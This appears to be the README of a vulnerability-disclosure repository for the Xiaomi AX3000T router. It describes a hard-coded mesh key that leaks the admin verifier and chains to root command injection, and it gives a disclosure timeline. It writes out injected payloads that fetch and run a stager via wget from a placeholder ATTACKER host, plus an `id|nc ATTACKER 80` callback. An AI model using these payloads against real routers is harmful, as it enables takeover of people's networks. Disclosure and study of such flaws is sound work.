# Xiaomi AX3000T (RD03v2) — `cab_meshd` admin takeover and pre-auth root RCE

An adjacent client that can reach an initialized CAP's `cab_meshd` can obtain
**web-admin access without the admin password** (V1). On RD03v2 stock 2.0.28,
we also demonstrated a V1 → V2 chain to an interactive root shell after minimal
initialization left `NETMODE` unset. Normal Xiaomi web setup can instead set
`NETMODE=whc_cap`, which blocks the demonstrated `cap_init` root path. The root
callback and interactive shell were confirmed on physical hardware in the
gate-open state; reachability after ordinary web setup has not been shown. A
second path is now confirmed on factory-reset hardware: an attacker on the WAN-side
L2 segment can impersonate a CAP and drive the uninitialized RE client directly to
root command execution, without V1, an admin session, or `init_router.py`.

> **Scope clarification, 2026-09-28:** Read [`CORRECTIONS.md`](CORRECTIONS.md)
> for the setup-state evidence and corrections to the original publication.
>
> **Hardware update, 2026-10-01:** The RE/WAN path was reproduced end-to-end on
> physical RD03v2 hardware. Read [`evidence/hardware-validation.md`](evidence/hardware-validation.md)
> and [`chain2-root-rce.md`](chain2-root-rce.md) for the corrected wire layout,
> argument-position requirements, and one-shot behavior.

> ### Published 2026-09-28
>
> This is the public release of a coordinated-disclosure package, first reported to
> Xiaomi on **2026-08-14** on a stated 45-day timeline. Nothing is patched.
>
> **It ships working proof-of-concept code for both hardware-confirmed root
> paths** — the initialized, gate-open OTA chain and the factory RE/WAN chain —
> because for the analysed model, the **Xiaomi AX3000T
> (`RD03v2`)**, escaping to OpenWrt is the only path off the vulnerable firmware, and
> the exploit is what makes that install possible without opening the case. That
> installer is **`RD03v2`-only**; it does not serve the other 28 verified model codes.
> Read [Mitigations for owners](mitigations.md) before running anything.
>
> Reported in full to the vendor, and to CERT/CC via VINCE (`VRF#26-09-SFWHW`).
> Timeline: [Disclosure](#disclosure).

---

## Affected product

| | |
|---|---|
| Device | Xiaomi Router AX3000T (`xiaomi.router.rd03v2`, hardware `RD03v2`) |
| Firmware | MiWiFi / XiaoQiang `romversion 2.0.28` (analysed and tested) |
| Component | `/usr/sbin/cab_meshd` (mesh commissioning daemon) |
| Service | TCP/UDP **19553** on LAN / Wi-Fi in CAP mode; outbound discovery and TLS on the selected WAN port in factory RE mode |

V1's hard-coded key is **firmware-global and line-wide** — not per-device and not
specific to this model. It is byte-identical in **28 Xiaomi and Redmi
router model codes** across **three CPU architectures** (ARM64, ARM32, MIPS32el) and
**three Wi-Fi generations (5, 6 and 7)** — from the sub-$25 Mi Router 4A Gigabit
Edition to the current BE10000 flagship still being shipped. This was verified by
downloading stock firmware, mostly from Xiaomi's own CDN, and extracting
`/usr/sbin/cab_meshd`: **28 of 28 obtainable images contain the key, with no
exceptions.** Listener scripts checked on unrelated model codes also use the
`INITTED=YES` → `cab_meshd -S -i br-lan` CAP gate; runtime takeover was not
tested on every model.

Full table, hashes, firmware URLs and a reproduction script:
[`evidence/cross-model/`](evidence/cross-model/). A single extraction yields
the key present in the other surveyed images; live authentication and login
were not tested on every model. **A per-model patch does not retire the shared
key from the rest of the line.**

---

## Primary finding — pre-auth admin takeover (confirmed)

An attacker who can reach TCP 19553 completes the mesh handshake using a
**hard-coded, firmware-global HMAC key** — no per-device secret, no client
certificate — which drives the daemon to `ST_RUNNING`. On that transition the CAP
**transmits its own web-admin login verifier** (`web_passwd256`, the exact SHA-256
the web login checks) to the peer inside the config-sync message. The attacker
computes `sha256(nonce ‖ web_passwd256)` and logs into the web UI as `admin`.

- No router-admin or mesh credentials after obtaining LAN or Wi-Fi access;
  no memory corruption or user interaction during V1.
- **Unconditional** — fires the moment `ST_RUNNING` is reached.
- **Confirmed end-to-end on physical hardware** (leaked the verifier, minted a
  valid admin session, read back real admin data). → [`chain1-admin-takeover.md`](chain1-admin-takeover.md)

Full admin over the router is itself total compromise: rewrite DNS to MITM all
traffic, open WAN management / port-forwards, disable the firewall, read Wi-Fi and
guest passwords, and pivot to LAN devices. The identical key across units makes a
single extraction weaponisable fleet-wide.

The enabling design flaws:

1. **CWE-798** — a hard-coded, firmware-global HMAC key (`838d364d…`, role byte
   `q`/`x`) is the sole mesh authenticator.
2. **CWE-295** — the TLS server sets `SSL_VERIFY_NONE`, accepting any client with
   no certificate.
3. **CWE-522/200** — the router sends its admin credential verifier
   (`web_passwd256`) to peers in the sync config.

---

## Primary finding #2 — unauthenticated root RCE (confirmed on hardware)

The same `eval` sink that V1's handshake reaches also accepts attacker-controlled
Wi-Fi configuration values planted via the admin API. V1 → V2 chains into a
**full-length, over-the-air root RCE** with an interactive root shell. This was
**confirmed end-to-end on physical RD03v2 hardware after the minimal
`init_router.py` setup left `NETMODE` unset**. The normal Xiaomi setup path can
set `whc_cap`, which gates this sink; a non-reset bypass from that state has not
been demonstrated.

Separately, a factory-reset RD03v2 starts `cab_meshd -C` after runtime port
assignment gives the DHCP WAN a nonempty interface name. A rogue CAP on that WAN
L2 segment can answer discovery, authenticate with the firmware-global `x` key,
and deliver a type-6 `re_init` payload that reaches the same root `eval`. This
direct path needs no V1, web login, admin API call, or prior initialization.

### OTA combined chain (the headline result)

1. V1 leaks `web_passwd256` over Wi-Fi → mints an admin `stok`.
2. Admin API (`set_wifi_without_restart`) plants command-injection payloads into the
   `encryption` UCI keys for the 2.4 GHz and 5 GHz bands. These fields are **exempt**
   from `hackCheck` (the web input sanitizer that blocks `` ;|$& ``), so arbitrary
   shell metacharacters pass through. The SSID is preserved (no visible change).
3. A `type-4→5→7` trigger fires `cap_init`. Inside `do_cap_init`,
   `mgmt_2g=$(uci get wireless.<iface>.encryption)` reads the poisoned value
   **raw** (not base64-laundered) and passes it into `mimesh_init.sh:717`'s `eval`.
4. The injected `\" wget http://ATTACKER/s -O /tmp/x #` breaks out of the
   `parse_json` quoting via `\"`→`"` un-escaping. `eval` becomes
   `mgmt_2g="" wget … #"…` — the shell assignment-prefix trick runs `wget` as root.
   The 5 GHz band carries `\" sh /tmp/x #`, executing the downloaded stager.
5. The stager calls back (`uid=0`), self-repairs the Wi-Fi (restores valid `psk2`
   encryption so the AP stays online), and opens a persistent reconnecting reverse
   shell.

- **Unlimited payload budget** — the `encryption` field has no length cap.
- **Confirmed on physical hardware**: root callback (`uid=0_user=root`), interactive
  BusyBox ash root shell, full `netstat -tlnp`, device model `RD03v2`.
- **CWE-78.** → [`chain2-root-rce.md`](chain2-root-rce.md)

### Direct injection variants

The `eval` sink is also reachable through two direct non-admin injection paths:

- **CAP/LAN variant** (initialized, gate-open router): a **~4-character** command
  via the type-4 plant. A completed `cap_init` can set `NETMODE=whc_cap` and
  close this path; normal setup can set the same mode.
- **RE/WAN variant** (factory-reset router): **confirmed end-to-end on physical
  hardware**. The router obtained a WAN DHCP lease, broadcast discovery, accepted
  the predicted `x38d…` CAP authenticator, and executed
  `` `id|nc ATTACKER 80` `` as `uid=0(root)`. A completed `re_init` sets
  `INITTED=YES` and stops the RE daemon, so the path is effectively one-shot per
  factory reset. The reliable non-overlapping field budgets are 32 bytes for
  `bh_ssid` and 64 bytes for `bh_pswd`; the encoder itself permits 36/66 bytes.

The OTA combined chain permits a full payload in the tested gate-open CAP state.

## Secondary findings

Presented with their evidence status — see
[`secondary-findings.md`](secondary-findings.md):

- **Credential hygiene:** the `/etc/shadow` root hash is a **static placeholder
  shared across models/firmware**, and the real per-device root password is
  **derivable from the label serial** via the publicly-reversed `mkxqimage`
  algorithm (`md5(SN ‖ salt)[:8]`). Telnet/SSH are locked in 2.0.x, so there is no
  network login surface today, but the credential design is weak.
- **Latent shared-code RCE — `misystem/download_search`:** a `?string` verifier
  that bypasses the web input filter, concatenated unquoted into a root
  `forkExec`. Doubly closed on RD03v2 (feature-gated off + a realpath/`/mnt`
  validator), but live on any SKU where `apps.download="1"`. Worth Xiaomi's
  attention as shared code.

---

## Repository layout

```
README.md                    this file
CORRECTIONS.md               dated setup-state and scope clarification
ADVISORY.md                  formal advisory (CVSS, CWEs, affected versions)
chain1-admin-takeover.md     PRIMARY #1 — admin takeover (V1), full writeup
chain2-root-rce.md           PRIMARY #2 — root RCE (V2), full writeup
technical-appendix.md        cab_meshd internals: key, handshake, wire protocol, addresses
secondary-findings.md        credentials (V3), download_search (V4)
remediation.md               recommended fixes, for the vendor
mitigations.md               what owners can do today (unpatched), and how to triage
LICENSE                      MIT — covers the code
LICENSE-docs                 CC BY 4.0 — covers the prose
NOTICE                       authorised-use, mode-gate and no-warranty terms — read first
evidence/
  hardware-validation.md     what was reproduced on physical hardware, and what was not
  independent-validation.md  third-party 2023 capture confirming the key, wire format
                             and handshake — on a different model, predating this work
  verify_public_capture.py   reproduces that confirmation (pure computation, sends nothing)
  cross-model/               the key across the Xiaomi router line: method, results, hashes
poc/
  README.md                  how to run the PoCs
  init_router.py             brings a factory unit into the testable (initialised) state
  handshake.py               mesh protocol driver (auth to ST_RUNNING; dumps sync config)
  extract_admin.py           PRIMARY PoC — leak verifier -> mint admin session
  ota_rce.py                 PRIMARY PoC — full OTA root RCE (V1+V2 combined), confirmed on hardware
  re_wan_rce.py              direct factory RE/WAN root RCE, confirmed on hardware
  rce_poc.py                 research PoC for the direct injection sink (CAP/LAN path)
  exploit.py                 historical non-working CAP driver retained for analysis
```

## Disclosure

| Date (UTC) | Event |
|---|---|
| **2026-08-14** | **Day 0** — initial notification to `security@xiaomi.com`: 45-day timeline, publication date stated |
| 2026-08-14 | Priority anchored with OpenTimestamps (Bitcoin-confirmed 2026-08-15) |
| 2026-08-17 | Xiaomi Security Center acknowledged (**day 3**). Full technical package sent, encrypted to the MiSRC PGP key |
| 2026-09-11 | **Day 28** — no substantive technical response in the 25 days since acknowledgement. Report filed with CERT/CC via VINCE: **`VRF#26-09-SFWHW`** |
| **2026-09-28** | **Day 45 — publication.** Technical advisory *and* weaponised proof-of-concept, together |
| **2026-10-01** | Factory RE/WAN path reproduced end-to-end on RD03v2 hardware; direct `uid=0(root)` callback without V1 or initialization |

The initial notification said weaponised PoC code would be withheld for a further
**30 days after a fix**. That plan was **changed on 2026-09-11**, and the change is
recorded in the coordination log. The reasoning: Xiaomi has not confirmed
reproduction, has committed to no timeline, and its published policy allows 180 days
*after a fix plan is complete*. Part of the affected range (RD05, RD13, RA82) appears
to have no update channel at all. Holding the exploit indefinitely would leave owners
of unpatched devices with nothing they can act on — the opposite of the point.

**Why the PoC ships with the advisory.** The objective is to let owners of the
analysed model — the **Xiaomi AX3000T (`RD03v2`)** — install OpenWrt **over the air**,
without opening the case or attaching UART. That capability *is* the exploit chain, so
the installer and the exploit cannot be separated. The installer is **`RD03v2`-only**:
it does not apply to any other affected model code, and OpenWrt support across the rest
of the range is model-specific — see [Mitigations for owners](mitigations.md) §4 and
[`evidence/cross-model/`](evidence/cross-model/). The installer itself is
[`ADCDS/ax3000t-ota-install`](https://github.com/ADCDS/ax3000t-ota-install).

All testing was performed by the reporter on devices purchased for this purpose. No
third-party or production systems were involved.

**Credit:** Adriel Santos. CVE handling is with CERT/CC and the Xiaomi CNA
(`CNA-2020-0019`).
